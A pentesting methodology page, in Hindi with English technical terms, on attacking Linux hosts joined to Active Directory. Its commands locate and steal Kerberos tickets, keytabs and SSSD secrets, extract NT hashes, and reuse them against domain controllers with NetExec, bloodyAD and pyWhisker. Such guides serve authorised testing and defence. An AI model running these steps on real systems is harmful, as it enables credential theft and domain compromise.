# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

एक linux मशीन भी एक Active Directory वातावरण के अंदर मौजूद हो सकती है।

एक AD के अंदर Linux मशीन **Kerberos सामग्री को locally store** कर सकती है: user ccaches, machine/service keytabs, और SSSD-managed secrets। इन artefacts को आमतौर पर किसी भी अन्य Kerberos credential की तरह reuse किया जा सकता है। इनमें से अधिकतर को पढ़ने के लिए आपको ticket का user owner होना होगा या मशीन पर **root** होना होगा।

## Enumeration

### linux से AD enumeration

यदि आपके पास linux में किसी AD पर access है (या Windows में bash) तो आप AD को enumerate करने के लिए [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) आज़मा सकते हैं।

आप **linux से AD को enumerate करने के अन्य तरीके** सीखने के लिए निम्न page भी देख सकते हैं:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA Microsoft Windows **Active Directory** का एक open-source **alternative** है, मुख्य रूप से **Unix** environments के लिए। यह Active Directory जैसी management के लिए एक पूर्ण **LDAP directory** को MIT **Kerberos** Key Distribution Center के साथ जोड़ता है। CA & RA certificate management के लिए Dogtag **Certificate System** का उपयोग करते हुए, यह smartcards सहित **multi-factor** authentication का समर्थन करता है। SSSD Unix authentication processes के लिए integrated है। इसके बारे में यहां और जानें:

{{#ref}}
../freeipa-pentesting.md
{{#endref}}

### Domain-joined host artefacts

tickets को छूने से पहले, पहचानें कि **host को AD से कैसे join किया गया था** और **Kerberos सामग्री वास्तव में कहाँ stored है**। आधुनिक Linux hosts पर यह आमतौर पर `realmd` + `adcli` + `sssd` द्वारा संभाला जाता है, न कि सिर्फ `/tmp` में flat files के रूप में:
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
यह आपको जल्दी से बता देता है कि host AD पर trust करता है या नहीं, क्या SSSD identities या tickets cache कर रहा है, और क्या abuse के लिए **machine/service keytabs** या **KCM secrets** उपलब्ध हैं।

## टिकट्स के साथ खेलना

### Pass The Ticket

इस पेज पर आपको अलग-अलग जगहें मिलेंगी जहाँ आप Linux host के अंदर **kerberos tickets** खोज सकते हैं, और अगले पेज पर आप सीख सकते हैं कि इन CCache ticket formats को Kirbi (Windows में उपयोग होने वाला format) में कैसे transform करना है, साथ ही PTT attack कैसे perform करना है:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

अगर आप **Linux-specific ticket harvesting workflows** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, आदि) चाहते हैं, तो dedicated page देखें:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### `/tmp` से CCACHE ticket reuse

CCACHE files binary formats हैं जो **Kerberos credentials** को store करने के लिए इस्तेमाल होते हैं। `FILE:/tmp/krb5cc_%{uid}` अभी भी common है, लेकिन modern Linux deployments में अब अक्सर `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}`, या `KCM:%{uid}` भी उपयोग होते हैं। `/tmp` में tickets मान लेने से पहले **`KRB5CCNAME`** environment variable और `default_ccache_name` setting को check करें।
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### keyring से CCACHE ticket reuse

**Process की memory में stored Kerberos tickets को extract किया जा सकता है**, खासकर जब machine की ptrace protection disabled हो (`/proc/sys/kernel/yama/ptrace_scope`). इस काम के लिए एक useful tool [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey) पर मिलती है, जो sessions में inject करके और tickets को `/tmp` में dump करके extraction को आसान बनाती है।

इस tool को configure और use करने के लिए, नीचे दिए गए steps follow किए जाते हैं:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
यह प्रक्रिया विभिन्न sessions में inject करने का प्रयास करेगी, और सफलता का संकेत extracted tickets को `/tmp` में `__krb_UID.ccache` नामकरण convention के साथ store करके देगी।

### CCACHE ticket reuse from SSSD KCM

SSSD डेटाबेस की एक copy path `/var/lib/sss/secrets/secrets.ldb` पर रखता है। संबंधित key path `/var/lib/sss/secrets/.secrets.mkey` पर एक hidden file के रूप में store की जाती है। Default रूप से, key केवल readable होती है यदि आपके पास **root** permissions हों।

**`SSSDKCMExtractor`** को --database और --key parameters के साथ invoke करने पर database parse होगा और **secrets को decrypt** किया जाएगा।
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
**credential cache Kerberos blob** को एक उपयोगी **Kerberos CCache** file में convert किया जा सकता है, जिसे Mimikatz/Rubeus को pass किया जा सकता है।

### Quick keytab triage
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### /etc/krb5.keytab से accounts निकालें

Service account keys, जो root privileges के साथ चलने वाली services के लिए essential हैं, securely **`/etc/krb5.keytab`** files में stored होती हैं। ये keys, services के passwords जैसी, strict confidentiality मांगती हैं।

keytab file की contents inspect करने के लिए, **`klist`** इस्तेमाल किया जा सकता है। Linux पर, `klist -k -K -e` principals, key version numbers, encryption types, और raw key material print करता है। अगर key type **23 / RC4-HMAC** है, तो key value उस principal का **NT hash** भी होता है।
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Linux उपयोगकर्ताओं के लिए, **`KeyTabExtract`** RC4 HMAC hash निकालने की functionality देता है, जिसे NTLM hash reuse के लिए leverage किया जा सकता है। ध्यान दें कि यह केवल तब मदद करता है जब keytab में अभी भी **etype 23 / RC4-HMAC** material मौजूद हो। **AES-only** environments में आपको reusable NT hash नहीं मिल सकता, लेकिन आप फिर भी Kerberos के जरिए keytab का उपयोग करके सीधे authenticate कर सकते हैं।
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
macOS पर, **`bifrost`** keytab file analysis के लिए एक tool के रूप में काम करता है।
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
निकाले गए account और hash information का उपयोग करके, servers से connections **`NetExec`** जैसे tools के साथ स्थापित किए जा सकते हैं।
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
```
### `/etc/krb5.keytab` से machine account का reuse

`realmd`/`adcli`/`sssd` joined systems पर, `/etc/krb5.keytab` में आमतौर पर **computer account** और एक या अधिक **host/service principals** होते हैं। अगर आपके पास **root** है, तो इसे सिर्फ dump न करें: `klist -k` द्वारा सूचीबद्ध principals में से किसी एक का उपयोग करके TGT request करें और Linux host की तरह operate करें।
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
यह विशेष रूप से उपयोगी है जब **computer object** के पास स्वयं AD में delegated rights हों या जब host को **gMSA** जैसे अन्य secrets retrieve करने की अनुमति हो।

### Reuse stolen Kerberos material with Linux-first AD tooling

एक बार आपके पास valid `ccache` या usable keytab हो जाए, तो आप AD के खिलाफ **directly from Linux** काम कर सकते हैं, बिना पहले सब कुछ Windows formats में convert किए। कई modern tools `KRB5CCNAME` / Kerberos auth को natively accept करते हैं:
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
यह **Linux post-exploitation** और **AD object abuse** के बीच एक अच्छा bridge है। object-level abuse paths के लिए, देखें:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account artefacts

हालिया Linux deployments सीधे AD से **Managed Service Accounts** consume कर सकते हैं। व्यवहार में इसका मतलब है कि, किसी Linux server को compromise करने के बाद, आपको केवल host keytab ही नहीं बल्कि gMSA से generated **service-specific keytabs** भी मिल सकते हैं। जांचने के common स्थान हैं `/etc/gmsad.conf`, deployment-specific config files, और `/etc` के अंतर्गत अतिरिक्त `*.keytab` files।
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
यह आपको उस gMSA से जुड़े SPNs के लिए एक reusable Kerberos identity देता है **बिना किसी Windows endpoint को छुए**। **domain-side** gMSA/dMSA abuse के लिए, AD में higher privileges के बाद, देखें:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating_rhel-systems-directly-with-active-directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating_rhel-systems-directly-with-active-directory)

{{#include ../../banners/hacktricks-training.md}}
